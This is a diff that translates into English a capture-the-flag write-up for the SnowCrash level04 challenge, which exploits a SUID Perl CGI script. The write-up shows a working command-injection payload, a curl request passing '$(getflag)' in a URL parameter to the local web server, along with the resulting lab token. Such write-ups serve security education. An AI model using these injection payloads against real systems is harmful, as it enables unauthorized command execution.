@@ -1,13 +1,13 @@
-1. **Buscando archivos**
+1. **Searching for files**
 
-    Encontramos otro archivo con permisos SUID
+    We found another file with SUID permissions:
     ```bash
     level04@SnowCrash:~$ ll
     [...]
     -rwsr-sr-x  1 flag04  level04  152 Mar  5  2016 level04.pl*
     [...]
     ```  
-    Con el comando `strings` encontramos este es un script Perl que funciona como una aplicación web CGI (Common Gateway Interface) y tiene una vulnerabilidad de `inyección de comandos`
+    Using the `strings` command, we found that this is a Perl script functioning as a CGI (Common Gateway Interface) web application and has a `command injection` vulnerability:
     ```bash
     level04@SnowCrash:~$ strings level04.pl 
     #!/usr/bin/perl
@@ -19,23 +19,22 @@
     print `echo $y 2>&1`;
     x(param("x"));
     ```   
-    `localhost:4747`: Sugiere que este script se ejecuta en un servidor web local en el puerto 4747
-    `Funcion vulnerable`: Define una función x que toma un argumento, lo guarda en $y
-    Ejecuta el comando echo $y 2>&1 a través de backticks (`) que permiten ejecución de comandos shell
+    `localhost:4747`: Suggests that this script runs on a local web server on port 4747.
+    `Vulnerable function`: Defines a function `x` that takes an argument, stores it in `$y`, and executes the command `echo $y 2>&1` using backticks (`), which allow shell command execution.
 
-2. **Explotación**
+2. **Exploitation**
 
-    Esta vulnerabilidad de inyección de comandos es bastante directa de explotar. Como el script se ejecuta con los permisos del usuario flag04 (debido al bit SUID) y utiliza la entrada del usuario sin sanitizar en un comando shell, podemos inyectar nuestros propios comandos.
-    - Revisamos si el servidor web esta corriendo
+    This command injection vulnerability is straightforward to exploit. Since the script runs with the permissions of the `flag04` user (due to the SUID bit) and uses unsanitized user input in a shell command, we can inject our own commands.
+    - Check if the web server is running:
     ```bash
     level04@SnowCrash:~$ netstat -tuln | grep 4747
     tcp6       0      0 :::4747                 :::*                    LISTEN  
     ```  
-    A continuacion inyectamos el comando `getflag`
+    Next, inject the `getflag` command:
     ```bash
     level04@SnowCrash:~$ curl 'http://localhost:4747/?x=$(getflag)'
     Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
-    ``` 
-    
+    ```
+
 
 
